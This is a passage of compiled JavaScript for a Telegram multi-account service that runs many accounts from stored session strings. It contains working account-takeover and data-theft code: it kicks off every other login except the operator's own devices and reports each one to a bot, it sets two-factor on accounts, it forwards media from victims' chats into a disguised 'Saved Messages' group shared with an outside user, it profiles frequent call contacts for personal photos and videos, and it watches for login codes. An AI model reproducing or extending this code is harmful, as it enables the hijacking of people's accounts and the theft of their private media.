const cloudinary_1 = __webpack_require__(/*! ../../cloudinary */ "./src/cloudinary.ts");
const active_channels_service_1 = __webpack_require__(/*! ../active-channels/active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const path = __importStar(__webpack_require__(/*! path */ "path"));
const channels_service_1 = __webpack_require__(/*! ../channels/channels.service */ "./src/components/channels/channels.service.ts");
let TelegramService = TelegramService_1 = class TelegramService {
    constructor(usersService, bufferClientService, activeChannelsService, channelsService) {
        this.usersService = usersService;
        this.bufferClientService = bufferClientService;
        this.activeChannelsService = activeChannelsService;
        this.channelsService = channelsService;
    }
    async onModuleDestroy() {
        await this.disconnectAll();
    }
    getActiveClientSetup() {
        return TelegramManager_1.default.getActiveClientSetup();
    }
    setActiveClientSetup(data) {
        TelegramManager_1.default.setActiveClientSetup(data);
    }
    async getClient(number) {
        const client = TelegramService_1.clientsMap.get(number);
        try {
            if (client && client.connected()) {
                await client.connect();
                return client;
            }
        }
        catch (error) {
            console.log(error);
        }
        return undefined;
    }
    hasClient(number) {
        return TelegramService_1.clientsMap.has(number);
    }
    async deleteClient(number) {
        const cli = await this.getClient(number);
        await cli?.disconnect();
        console.log("Disconnected : ", number);
        return TelegramService_1.clientsMap.delete(number);
    }
    async disconnectAll() {
        const data = TelegramService_1.clientsMap.entries();
        console.log("Disconnecting All Clients");
        for (const [phoneNumber, client] of data) {
            try {
                await client?.disconnect();
                TelegramService_1.clientsMap.delete(phoneNumber);
                console.log(`Client disconnected: ${phoneNumber}`);
            }
            catch (error) {
                console.log((0, utils_1.parseError)(error));
                console.log(`Failed to Disconnect : ${phoneNumber}`);
            }
        }
        TelegramService_1.clientsMap.clear();
        this.bufferClientService.clearJoinChannelInterval();
    }
    async createClient(mobile, autoDisconnect = true, handler = true) {
        const user = (await this.usersService.search({ mobile }))[0];
        if (!user) {
            throw new common_1.BadRequestException('user not found');
        }
        if (!this.hasClient(mobile)) {
            let telegramManager = new TelegramManager_1.default(user.session, user.mobile);
            let client;
            try {
                client = await telegramManager.createClient(handler);
                await client.getMe();
                if (client) {
                    TelegramService_1.clientsMap.set(mobile, telegramManager);
                    if (autoDisconnect) {
                        setTimeout(async () => {
                            if (client.connected || await this.getClient(mobile)) {
                                console.log("SELF destroy client : ", mobile);
                                await telegramManager.disconnect();
                            }
                            else {
                                console.log("Client Already Disconnected : ", mobile);
                            }
                            TelegramService_1.clientsMap.delete(mobile);
                        }, 180000);
                    }
                    else {
                        setInterval(async () => {
                        }, 20000);
                    }
                    return telegramManager;
                }
                else {
                    throw new common_1.BadRequestException('Client Expired');
                }
            }
            catch (error) {
                console.log("Parsing Error");
                if (telegramManager) {
                    await telegramManager.disconnect();
                    telegramManager = null;
                    TelegramService_1.clientsMap.delete(mobile);
                }
                const errorDetails = (0, utils_1.parseError)(error);
                if ((0, utils_1.contains)(errorDetails.message.toLowerCase(), ['expired', 'unregistered', 'deactivated', "session_revoked", "user_deactivated_ban"])) {
                    console.log("Deleting User: ", user.mobile);
                    await this.usersService.updateByFilter({ $or: [{ tgId: user.tgId }, { mobile: mobile }] }, { expired: true });
                }
                else {
                    console.log('Not Deleting user');
                }
                throw new common_1.BadRequestException(errorDetails.message);
            }
        }
        else {
            console.log("Client Already exists");
            return await this.getClient(mobile);
        }
    }
    async getMessages(mobile, username, limit = 8) {
        const telegramClient = await this.getClient(mobile);
        return telegramClient.getMessages(username, limit);
    }
    async getMessagesNew(mobile, username, offset, limit) {
        const telegramClient = await this.getClient(mobile);
        return telegramClient.getMessagesNew(username, offset, limit);
    }
    async sendInlineMessage(mobile, chatId, message, url) {
        const telegramClient = await this.getClient(mobile);
        return telegramClient.sendInlineMessage(chatId, message, url);
    }
    async getChatId(mobile, username) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.getchatId(username);
    }
    async getLastActiveTime(mobile) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.getLastActiveTime();
    }
    async tryJoiningChannel(mobile, chatEntity) {
        const telegramClient = await this.getClient(mobile);
        try {
            await telegramClient.joinChannel(chatEntity.username);
            console.log(telegramClient.phoneNumber, " - Joined channel Success - ", chatEntity.username);
            if (chatEntity.canSendMsgs) {
            }
            else {
                await this.channelsService.remove(chatEntity.channelId);
                await this.activeChannelsService.remove(chatEntity.channelId);
                console.log("Removed Channel- ", chatEntity.username);
            }
        }
        catch (error) {
            console.log(telegramClient.phoneNumber, " - Failed to join - ", chatEntity.username);
            this.removeChannels(error, chatEntity.channelId, chatEntity.username);
            throw error;
        }
    }
    ;
    async removeChannels(error, channelId, username) {
        if (error.errorMessage == "USERNAME_INVALID" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes("No user has")) {
            try {
                if (channelId) {
                    await this.channelsService.remove(channelId);
                    await this.activeChannelsService.remove(channelId);
                    console.log("Removed Channel- ", channelId);
                }
                else {
                    const channelDetails = (await this.channelsService.search({ username: username }))[0];
                    await this.channelsService.remove(channelDetails.channelId);
                    await this.activeChannelsService.remove(channelDetails.channelId);
                    console.log("Removed Channel - ", channelDetails.channelId);
                }
            }
            catch (searchError) {
                console.log("Failed to search/remove channel: ", searchError);
            }
        }
        else if (error.errorMessage === "CHANNEL_PRIVATE") {
            await this.channelsService.update(channelId, { private: true });
            await this.activeChannelsService.update(channelId, { private: true });
        }
    }
    async getGrpMembers(mobile, entity) {
        try {
            const telegramClient = await this.getClient(mobile);
            return await telegramClient.getGrpMembers(entity);
        }
        catch (err) {
            console.error("Error fetching group members:", err);
        }
    }
    async addContact(mobile, data, prefix) {
        try {
            const telegramClient = await this.getClient(mobile);
            return await telegramClient.addContact(data, prefix);
        }
        catch (err) {
            console.error("Error fetching adding Contacts:", err);
        }
    }
    async addContacts(mobile, phoneNumbers, prefix) {
        try {
            const telegramClient = await this.getClient(mobile);
            return await telegramClient.addContacts(phoneNumbers, prefix);
        }
        catch (err) {
            console.error("Error fetching adding Contacts:", err);
        }
    }
    async removeOtherAuths(mobile) {
        const telegramClient = await this.getClient(mobile);
        await telegramClient.removeOtherAuths();
        return 'Authorizations removed successfully';
    }
    async getSelfMsgsInfo(mobile) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.getSelfMSgsInfo();
    }
    async createGroup(mobile) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.createGroup();
    }
    async forwardSecrets(mobile, fromChatId) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.createGroupAndForward(fromChatId);
    }
    async joinChannelAndForward(mobile, fromChatId, channel) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.joinChannelAndForward(fromChatId, channel);
    }
    async getCallLog(mobile) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.getCallLog();
    }
    async getmedia(mobile) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.getMediaMessages();
    }
    async getChannelInfo(mobile, sendIds = false) {
        const telegramClient = await this.getClient(mobile);
        const result = await telegramClient.getDialogs({ limit: 10, archived: false });
        return await telegramClient.channelInfo(sendIds);
    }
    async getAuths(mobile) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.getAuths();
    }
    async getMe(mobile) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.getMe();
    }
    async createNewSession(mobile) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.createNewSession();
    }
    async set2Fa(mobile) {
        const telegramClient = await this.getClient(mobile);
        try {
            await telegramClient.set2fa();
            await telegramClient.disconnect();
            return '2Fa set successfully';
        }
        catch (error) {
            const errorDetails = (0, utils_1.parseError)(error);
            throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
        }
    }
    async updatePrivacyforDeletedAccount(mobile) {
        const telegramClient = await this.getClient(mobile);
        await telegramClient.updatePrivacyforDeletedAccount();
    }
    async deleteProfilePhotos(mobile) {
        const telegramClient = await this.getClient(mobile);
        await telegramClient.deleteProfilePhotos();
    }
    async setProfilePic(mobile, name) {
        const telegramClient = await this.getClient(mobile);
        await telegramClient.deleteProfilePhotos();
        try {
            await cloudinary_1.CloudinaryService.getInstance(name);
            await (0, utils_1.sleep)(2000);
            const rootPath = process.cwd();
            console.log("checking path", rootPath);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));
            await (0, utils_1.sleep)(3000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));
            await (0, utils_1.sleep)(3000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));
            await (0, utils_1.sleep)(1000);
            await telegramClient.disconnect();
            return 'Profile pic set successfully';
        }
        catch (error) {
            const errorDetails = (0, utils_1.parseError)(error);
            throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
        }
    }
    async updatePrivacy(mobile) {
        const telegramClient = await this.getClient(mobile);
        try {
            await telegramClient.updatePrivacy();
            return "Privacy updated successfully";
        }
        catch (error) {
            const errorDetails = (0, utils_1.parseError)(error);
            throw new common_1.HttpException(errorDetails.message, parseInt(errorDetails.status));
        }
    }
    async downloadProfilePic(mobile, index) {
        const telegramClient = await this.getClient(mobile);
        try {
            return await telegramClient.downloadProfilePic(index);
        }
        catch (error) {
            console.log("Some Error: ", (0, utils_1.parseError)(error), error);
            throw new Error("Failed to update username");
        }
    }
    async updateUsername(mobile, username) {
        const telegramClient = await this.getClient(mobile);
        try {
            return await telegramClient.updateUsername(username);
        }
        catch (error) {
            console.log("Some Error: ", (0, utils_1.parseError)(error), error);
            throw new Error("Failed to update username");
        }
    }
    async getMediaMetadata(mobile, chatId, offset, limit) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.getMediaMetadata(chatId, offset, limit);
    }
    async downloadMediaFile(mobile, messageId, chatId, res) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.downloadMediaFile(messageId, chatId, res);
    }
    async forwardMessage(mobile, chatId, messageId) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.forwardMessage(chatId, messageId);
    }
    async leaveChannels(mobile) {
        const telegramClient = await this.getClient(mobile);
        const channelinfo = await telegramClient.channelInfo(false);
        const leaveChannelIds = channelinfo.canSendFalseChats;
        return await telegramClient.leaveChannels(leaveChannelIds);
    }
    async leaveChannel(mobile, channel) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.leaveChannels([channel]);
    }
    async deleteChat(mobile, chatId) {
        const telegramClient = await this.getClient(mobile);
        return await telegramClient.deleteChat(chatId);
    }
    async updateNameandBio(mobile, firstName, about) {
        const telegramClient = await this.getClient(mobile);
        try {
            await telegramClient.updateProfile(firstName, about);
            return "Username updated successfully";
        }
        catch (error) {
            console.log("Some Error: ", (0, utils_1.parseError)(error), error);
            throw new Error("Failed to update username");
        }
    }
};
exports.TelegramService = TelegramService;
TelegramService.clientsMap = new Map();
exports.TelegramService = TelegramService = TelegramService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => channels_service_1.ChannelsService))),
    __metadata("design:paramtypes", [users_service_1.UsersService,
        buffer_client_service_1.BufferClientService,
        active_channels_service_1.ActiveChannelsService,
        channels_service_1.ChannelsService])
], TelegramService);


/***/ }),

/***/ "./src/components/Telegram/TelegramManager.ts":
/*!****************************************************!*\
  !*** ./src/components/Telegram/TelegramManager.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const sessions_1 = __webpack_require__(/*! telegram/sessions */ "telegram/sessions");
const events_1 = __webpack_require__(/*! telegram/events */ "telegram/events");
const tl_1 = __webpack_require__(/*! telegram/tl */ "telegram/tl");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const uploads_1 = __webpack_require__(/*! telegram/client/uploads */ "telegram/client/uploads");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils.ts");
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const Logger_1 = __webpack_require__(/*! telegram/extensions/Logger */ "telegram/extensions/Logger");
const IMap_1 = __webpack_require__(/*! ../../IMap/IMap */ "./src/IMap/IMap.ts");
const big_integer_1 = __importDefault(__webpack_require__(/*! big-integer */ "big-integer"));
class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new sessions_1.StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.channelArray = [];
    }
    static getActiveClientSetup() {
        return TelegramManager.activeClientSetup;
    }
    static setActiveClientSetup(data) {
        TelegramManager.activeClientSetup = data;
    }
    async createGroup() {
        const groupName = "Saved Messages";
        const groupDescription = this.phoneNumber;
        const result = await this.client.invoke(new tl_1.Api.channels.CreateChannel({
            title: groupName,
            about: groupDescription,
            megagroup: true,
            forImport: true,
        }));
        const { id, accessHash } = result.chats[0];
        const folderId = 1;
        await this.client.invoke(new tl_1.Api.folders.EditPeerFolders({
            folderPeers: [
                new tl_1.Api.InputFolderPeer({
                    peer: new tl_1.Api.InputPeerChannel({
                        channelId: id,
                        accessHash: accessHash,
                    }),
                    folderId: folderId,
                }),
            ],
        }));
        const usersToAdd = ["fuckyoubabie"];
        const addUsersResult = await this.client.invoke(new tl_1.Api.channels.InviteToChannel({
            channel: new tl_1.Api.InputChannel({
                channelId: id,
                accessHash: accessHash,
            }),
            users: usersToAdd
        }));
        return { id, accessHash };
    }
    async createGroupAndForward(fromChatId) {
        const { id, accessHash } = await this.createGroup();
        await this.forwardSecretMsgs(fromChatId, id.toString());
    }
    async joinChannelAndForward(fromChatId, channel) {
        const result = await this.joinChannel(channel);
        const folderId = 1;
        await this.client.invoke(new tl_1.Api.folders.EditPeerFolders({
            folderPeers: [
                new tl_1.Api.InputFolderPeer({
                    peer: new tl_1.Api.InputPeerChannel({
                        channelId: result.chats[0].id,
                        accessHash: result.chats[0].accessHash,
                    }),
                    folderId: folderId,
                }),
            ],
        }));
        await this.forwardSecretMsgs(fromChatId, channel);
    }
    async forwardSecretMsgs(fromChatId, toChatId) {
        let offset = 0;
        let limit = 100;
        let totalMessages = 0;
        let forwardedCount = 0;
        let messages = [];
        do {
            messages = await this.client.getMessages(fromChatId, { offsetId: offset, limit });
            totalMessages = messages.total;
            const messageIds = messages.map((message) => {
                offset = message.id;
                if (message.id && message.media) {
                    return message.id;
                }
                return undefined;
            }).filter(id => id !== undefined);
            console.log(messageIds);
            if (messageIds.length > 0) {
                try {
                    const result = await this.client.forwardMessages(toChatId, {
                        messages: messageIds,
                        fromPeer: fromChatId,
                    });
                    forwardedCount += messageIds.length;
                    console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                    await (0, Helpers_1.sleep)(5000);
                }
                catch (error) {
                    console.error("Error occurred while forwarding messages:", error);
                }
                await (0, Helpers_1.sleep)(5000);
            }
        } while (messages.length > 0);
        await this.leaveChannels([toChatId]);
        return;
    }
    async forwardMessages(fromChatId, toChatId, messageIds) {
        const chunkSize = 30;
        const totalMessages = messageIds.length;
        let forwardedCount = 0;
        for (let i = 0; i < totalMessages; i += chunkSize) {
            const chunk = messageIds.slice(i, i + chunkSize);
            try {
                const result = await this.client.forwardMessages(toChatId, {
                    messages: chunk,
                    fromPeer: fromChatId,
                });
                forwardedCount += chunk.length;
                console.log(`Forwarded ${forwardedCount} / ${totalMessages} messages`);
                await (0, Helpers_1.sleep)(5000);
            }
            catch (error) {
                console.error("Error occurred while forwarding messages:", error);
            }
        }
        return forwardedCount;
    }
    async disconnect() {
        if (this.client) {
            console.log("Destroying Client: ", this.phoneNumber);
            this.client._destroyed = true;
            await this.client.disconnect();
            this.client = null;
        }
        this.session.delete();
    }
    async getchatId(username) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const entity = await this.client.getInputEntity(username);
        return entity;
    }
    async getMe() {
        const me = await this.client.getMe();
        return me;
    }
    async errorHandler(error) {
        (0, utils_1.parseError)(error);
        if (error.message && error.message == 'TIMEOUT') {
        }
        else {
            console.error(`Error occurred for API ID ${this.phoneNumber}:`, error);
        }
    }
    async createClient(handler = true, handlerFn) {
        this.client = new telegram_1.TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
            connectionRetries: 5,
        });
        this.client.setLogLevel(Logger_1.LogLevel.ERROR);
        this.client._errorHandler = this.errorHandler;
        await this.client.connect();
        const me = await this.client.getMe();
        console.log("Connected Client : ", me.phone);
        if (handler && this.client) {
            console.log("Adding event Handler");
            if (handlerFn) {
                this.client.addEventHandler(async (event) => { await handlerFn(event); }, new events_1.NewMessage());
            }
            else {
                this.client.addEventHandler(async (event) => { await this.handleEvents(event); }, new events_1.NewMessage());
            }
        }
        return this.client;
    }
    async getGrpMembers(entity) {
        try {
            const result = [];
            const chat = await this.client.getEntity(entity);
            if (!(chat instanceof tl_1.Api.Chat || chat instanceof tl_1.Api.Channel)) {
                console.log("Invalid group or channel!");
                return;
            }
            console.log(`Fetching members of ${chat.title || chat.username}...`);
            const participants = await this.client.invoke(new tl_1.Api.channels.GetParticipants({
                channel: chat,
                filter: new tl_1.Api.ChannelParticipantsRecent(),
                offset: 0,
                limit: 200,
                hash: (0, big_integer_1.default)(0),
            }));
            if (participants instanceof tl_1.Api.channels.ChannelParticipants) {
                const users = participants.participants;
                console.log(`Members: ${users.length}`);
                for (const user of users) {
                    const userInfo = user instanceof tl_1.Api.ChannelParticipant ? user.userId : null;
                    if (userInfo) {
                        const userDetails = await this.client.getEntity(userInfo);
                        result.push({
                            tgId: userDetails.id,
                            name: `${userDetails.firstName || ""} ${userDetails.lastName || ""}`,
                            username: `${userDetails.username || ""}`,
                        });
                        if (userDetails.firstName == 'Deleted Account' && !userDetails.username) {
                            console.log(JSON.stringify(userDetails.id));
                        }
                    }
                    else {
                        console.log(JSON.stringify(user?.userId));
                    }
                }
            }
            else {
                console.log("No members found or invalid group.");
            }
            console.log(result.length);
            return result;
        }
        catch (err) {
            console.error("Error fetching group members:", err);
        }
    }
    async getMessages(entityLike, limit = 8) {
        const messages = await this.client.getMessages(entityLike, { limit });
        return messages;
    }
    async getDialogs(params) {
        const chats = await this.client.getDialogs(params);
        console.log("TotalChats:", chats.total);
        return chats;
    }
    async getLastMsgs(limit) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const msgs = await this.client.getMessages("777000", { limit });
        let resp = '';
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp += msg.text + "\n";
        });
        return resp;
    }
    async getSelfMSgsInfo() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const self = await this.client.getMe();
        const selfChatId = self.id;
        let photoCount = 0;
        let ownPhotoCount = 0;
        let ownVideoCount = 0;
        let otherPhotoCount = 0;
        let otherVideoCount = 0;
        let videoCount = 0;
        let movieCount = 0;
        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 });
        for (const message of messageHistory) {
            const text = message.text.toLocaleLowerCase();
            if ((0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++;
            }
            else {
                if (message.photo) {
                    photoCount++;
                    if (!message.fwdFrom) {
                        ownPhotoCount++;
                    }
                    else {
                        otherPhotoCount++;
                    }
                }
                else if (message.video) {
                    videoCount++;
                    if (!message.fwdFrom) {
                        ownVideoCount++;
                    }
                    else {
                        otherVideoCount++;
                    }
                }
            }
        }
        return ({ total: messageHistory.total, photoCount, videoCount, movieCount, ownPhotoCount, otherPhotoCount, ownVideoCount, otherVideoCount });
    }
    async channelInfo(sendIds = false) {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 1500 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0;
        this.channelArray.length = 0;
        const canSendFalseChats = [];
        console.log("TotalChats:", chats.total);
        for (const chat of chats) {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = chat.entity.toJSON();
                    const { broadcast, defaultBannedRights, id } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(id.toString()?.replace(/^-100/, ""));
                    }
                    else {
                        canSendFalseCount++;
                        canSendFalseChats.push(id.toString()?.replace(/^-100/, ""));
                    }
                }
                catch (error) {
                    (0, utils_1.parseError)(error);
                }
            }
        }
        ;
        return {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : [],
            canSendFalseChats
        };
    }
    async addContact(data, namePrefix) {
        try {
            for (let i = 0; i < data.length; i++) {
                const user = data[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                try {
                    await this.client.invoke(new tl_1.Api.contacts.AddContact({
                        firstName,
                        lastName,
                        phone: user.mobile,
                        id: user.tgId
                    }));
                }
                catch (e) {
                    console.log(e);
                }
            }
        }
        catch (error) {
            console.error("Error adding contacts:", error);
            (0, utils_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async addContacts(mobiles, namePrefix) {
        try {
            const inputContacts = [];
            for (let i = 0; i < mobiles.length; i++) {
                const user = mobiles[i];
                const firstName = `${namePrefix}${i + 1}`;
                const lastName = "";
                const clientId = (0, big_integer_1.default)((i << 16 | 0).toString(10));
                inputContacts.push(new tl_1.Api.InputPhoneContact({
                    clientId: clientId,
                    phone: user,
                    firstName: firstName,
                    lastName: lastName
                }));
            }
            const result = await this.client.invoke(new tl_1.Api.contacts.ImportContacts({
                contacts: inputContacts,
            }));
            console.log("Imported Contacts Result:", result);
        }
        catch (error) {
            console.error("Error adding contacts:", error);
            (0, utils_1.parseError)(error, `Failed to save contacts`);
        }
    }
    async leaveChannels(chats) {
        console.log("Leaving Channels: initaied!!");
        console.log("ChatsLength: ", chats);
        for (let id of chats) {
            try {
                const joinResult = await this.client.invoke(new tl_1.Api.channels.LeaveChannel({
                    channel: id
                }));
                console.log("Left channel :", id);
                if (chats.length > 1) {
                    await (0, Helpers_1.sleep)(30000);
                }
            }
            catch (error) {
                const errorDetails = (0, utils_1.parseError)(error);
                console.log("Failed to leave channel :", errorDetails.message);
            }
        }
    }
    async getEntity(entity) {
        return await this.client?.getEntity(entity);
    }
    async joinChannel(entity) {
        console.log("trying to join channel : ", entity);
        return await this.client?.invoke(new tl_1.Api.channels.JoinChannel({
            channel: await this.client?.getEntity(entity)
        }));
    }
    connected() {
        return this.client.connected;
    }
    async connect() {
        return await this.client.connect();
    }
    async removeOtherAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        for (const auth of result.authorizations) {
            if (this.isAuthMine(auth)) {
                continue;
            }
            else {
                await (0, utils_1.fetchWithTimeout)(`${(0, utils_1.ppplbot)()}&text=${encodeURIComponent(`Removing Auth : ${this.phoneNumber}\n${auth.appName}:${auth.country}:${auth.deviceModel}`)}`);
                await this.resetAuthorization(auth);
            }
        }
    }
    isAuthMine(auth) {
        return auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
            auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
            auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
            auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru') ||
            auth.appName.toLowerCase().includes("hanslnz") || auth.deviceModel.toLowerCase().includes('windows');
    }
    async resetAuthorization(auth) {
        await this.client?.invoke(new tl_1.Api.account.ResetAuthorization({ hash: auth.hash }));
    }
    async getAuths() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const result = await this.client.invoke(new tl_1.Api.account.GetAuthorizations());
        return result;
    }
    async getAllChats() {
        if (!this.client)
            throw new Error('Client is not initialized');
        const chats = await this.client.getDialogs({ limit: 500 });
        console.log("TotalChats:", chats.total);
        const chatData = [];
        for (const chat of chats) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getMessagesNew(chatId, offset = 0, limit = 20) {
        const messages = await this.client.getMessages(chatId, {
            offsetId: offset,
            limit,
        });
        const result = await Promise.all(messages.map(async (message) => {
            const media = message.media
                ? {
                    type: message.media.className.includes('video') ? 'video' : 'photo',
                    thumbnailUrl: await this.getMediaUrl(message),
                }
                : null;
            return {
                id: message.id,
                message: message.message,
                date: message.date,
                sender: {
                    id: message.senderId?.toString(),
                    is_self: message.out,
                    username: message.fromId ? message.fromId.toString() : null,
                },
                media,
            };
        }));
        return result;
    }
    async getMediaUrl(message) {
        if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
            console.log("messageId image:", message.id);
            const sizes = message.photo?.sizes || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        else if (message.media instanceof tl_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
            console.log("messageId video:", message.id);
            const sizes = message.document?.thumbs || [1];
            return await this.client.downloadMedia(message, { thumb: sizes[1] ? sizes[1] : sizes[0] });
        }
        return null;
    }
    async sendInlineMessage(chatId, message, url) {
        const button = {
            text: "Open URL",
            url: url,
        };
        const result = await this.client.sendMessage(chatId, {
            message: message,
            buttons: [new tl_1.Api.KeyboardButtonUrl(button)]
        });
        return result;
    }
    async getMediaMessages() {
        const result = await this.client.invoke(new tl_1.Api.messages.Search({
            peer: new tl_1.Api.InputPeerEmpty(),
            q: '',
            filter: new tl_1.Api.InputMessagesFilterPhotos(),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        return result;
    }
    async getCallLog() {
        const result = await this.client.invoke(new tl_1.Api.messages.Search({
            peer: new tl_1.Api.InputPeerEmpty(),
            q: '',
            filter: new tl_1.Api.InputMessagesFilterPhoneCalls({}),
            minDate: 0,
            maxDate: 0,
            offsetId: 0,
            addOffset: 0,
            limit: 200,
            maxId: 0,
            minId: 0,
            hash: (0, big_integer_1.default)(0),
        }));
        const callLogs = result.messages.filter((message) => message.action instanceof tl_1.Api.MessageActionPhoneCall);
        const filteredResults = {
            outgoing: 0,
            incoming: 0,
            video: 0,
            chatCallCounts: {},
            totalCalls: 0
        };
        for (const log of callLogs) {
            filteredResults.totalCalls++;
            const logAction = log.action;
            if (log.out) {
                filteredResults.outgoing++;
            }
            else {
                filteredResults.incoming++;
            }
            if (logAction.video) {
                filteredResults.video++;
            }
            const chatId = log.peerId.userId.toString();
            if (!filteredResults.chatCallCounts[chatId]) {
                const ent = await this.client.getEntity(chatId);
                filteredResults.chatCallCounts[chatId] = {
                    phone: ent.phone,
                    username: ent.username,
                    name: `${ent.firstName}  ${ent.lastName ? ent.lastName : ''}`,
                    count: 0
                };
            }
            filteredResults.chatCallCounts[chatId].count++;
        }
        const filteredChatCallCounts = [];
        for (const [chatId, details] of Object.entries(filteredResults.chatCallCounts)) {
            if (details['count'] > 4) {
                let video = 0;
                let photo = 0;
                const msgs = await this.client.getMessages(chatId, { limit: 600 });
                for (const message of msgs) {
                    const text = message.text.toLocaleLowerCase();
                    if (!(0, utils_1.contains)(text, ['movie', 'series', '1080', '720', 'terabox', '640', 'title', 'aac', '265', '264', 'instagr', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                        if (message.media instanceof tl_1.Api.MessageMediaPhoto) {
                            photo++;
                        }
                        else if (message.media instanceof tl_1.Api.MessageMediaDocument && (message.document?.mimeType?.startsWith('video') || message.document?.mimeType?.startsWith('image'))) {
                            video++;
                        }
                    }
                }
                filteredChatCallCounts.push({
                    ...details,
                    msgs: msgs.total,
                    video,
                    photo,
                    chatId,
                });
            }
        }
        console.log({
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        });
        return {
            ...filteredResults,
            chatCallCounts: filteredChatCallCounts
        };
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log(event.message.text.toLowerCase());
